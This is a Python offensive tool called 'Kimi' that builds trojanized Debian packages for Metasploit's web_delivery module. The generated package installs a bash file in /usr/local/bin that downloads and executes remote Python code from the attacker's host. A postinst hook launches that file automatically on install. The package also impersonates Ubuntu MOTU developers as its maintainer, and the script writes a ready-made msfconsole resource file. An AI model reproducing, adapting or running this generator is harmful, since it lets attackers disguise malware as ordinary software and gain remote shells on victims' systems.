#!/usr/bin/env python

# ____  __. .__             .__
#|    |/ _| |__|   _____    |__|
#|      <   |  |  /      \  |  |
#|    |  \  |  | |  Y Y   \ |  |
#|____|__ \ |__| |__|_|   / |__|
#        \/            \./Suspicious Shell Activity
#        Malicious Debain Package Creator
#        Coded by Chaitanya Haritash
#        Twitter :: @bofheaded

##
# Information :::

#Kimi is a script which generates Malicious debian package for metasploit
#which consists of bash file. the bash file is deployed into "/usr/local/bin/" directory.
#Bash file injects and acts like some system command which when executed by victim
#and attacker hits with session.

#Kimi basically depends upon web_delivery module and every thing is automated.
#all the attacker needs is to do following settings :

#NOTE :: This project was made to be integrated with Venom Shellcode Generator 1.0.13.
#       It can be used standalone also all user needs is to change uripath in msf variables

#msf exploit(web_delivery) > set srvhost 192.168.0.102
#srvhost => 192.168.0.102
#msf exploit(web_delivery) > set uripath SecPatch
#uripath => SecPatch
#msf exploit(web_delivery) > set uripath /SecPatch
#uripath => /SecPatch
#msf exploit(web_delivery) > set Lhost 192.168.0.102
#Lhost => 192.168.0.102
#msf exploit(web_delivery) > show options
#msf exploit(web_delivery) > exploit

#Thanks r00t 3xpl0it for all corrections and ideas :) <3

##

import os,time
import argparse,sys

def printer():
     global banner
     banner = """
 ____  __. .__             .__
|    |/ _| |__|   _____    |__|
|      <   |  |  /      \  |  |
|    |  \  |  | |  Y Y   \ |  |
|____|__ \ |__| |__|_|   / |__| Ver.1.1
        \/            \./Suspicious Shell Activity
        Malicious Debain Package Creator
        Coded by Chaitanya Haritash
        Twitter :: @bofheaded
  """
def main():
  try:
    print banner
    parser = argparse.ArgumentParser()
    parser.add_argument('-n','--name', help="Name for your package" , required="true")
    parser.add_argument('-l','--lhost', help="LHOST, for Handler" , required="true")
    parser.add_argument('-V','--vers', help="Version for package" , required="true")
    parser.add_argument('-a','--arch', help="Architecture (i386/amd64)" , required="true")
    global go
    go = parser.parse_args()
    global h
    global j
    global we
    global uu
    h = str(go.name)
    j = str(go.name)+"_"+str(go.vers)
    we = str(go.lhost)
    uu = str(go.arch)
    with open(h, "w+") as r:
      payload = """
#!/bin/bash
python -c "import urllib2; r = urllib2.urlopen('http://"""+str(go.lhost)+""":8080/SecPatch'); exec(r.read());"

          """
      k = r.write(payload)
      o = open("postinst" , "a")
      m = """

#!/bin/bash

chmod 2755 /usr/local/bin/"""+h+""" && /usr/local/bin/"""+h+""" &

      """
      o.write(m)
      o.close()
      os.system("chmod 0755 postinst")
      print ""
      print "kimi finally done with it ;) happy injecting !!"
      print ""
  except IOError:
    print banner
    print "[-] please provide valid arguments [-]"
    print ""

  #else:
  # print banner

def make_deb():
  gen = """
#!/bin/sh
chmod u+x """+h+"""
cat >> control << EOF

Package: """+str(go.name)+"""
Version: """+str(go.vers)+"""
Section: Games and Amusement
Priority: optional
Architecture: """+uu+"""
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: MDPC kimi (SSA-RedTeam development 2017)

EOF

mkdir -p """+j+"""/usr/local/bin
cp """+h+""" """+j+"""/usr/local/bin
sleep 2
mkdir -p """+j+"""/DEBIAN
cp control """+j+"""/DEBIAN/control
cp postinst """+j+"""/DEBIAN/postinst
sleep 3
dpkg-deb --build """+j+"""
sleep 5
rm -rf """+h+"""
rm -rf control
rm -rf postinst
rm -rf """+j+"""
rm -rf fro.sh

  """
  er = open("fro.sh" , "w")
  er.write(gen)
  er.close()

  os.system("chmod +x fro.sh")
  os.system("./fro.sh")
  os.system("sudo chmod 777 *.deb")

def make_resource():

    res = """
use exploit/multi/script/web_delivery
set SRVHOST """+we+"""
set LHOST """+we+"""
set URIPATH /SecPatch
exploit
    """
#
# No need to execute handler
# venom will take care of that
#
    b = open("handler.rc" , "w")
    b.write(res)
    b.close()
    #print "execute handler: sudo msfconsole -r handler.rc"
    time.sleep(2)
    os.system("chmod 777 handler.rc")
    #os.system('xterm -e "sudo msfconsole -r handler.rc"')

if __name__ == '__main__':
  printer()
  main()
  make_deb()
  make_resource()
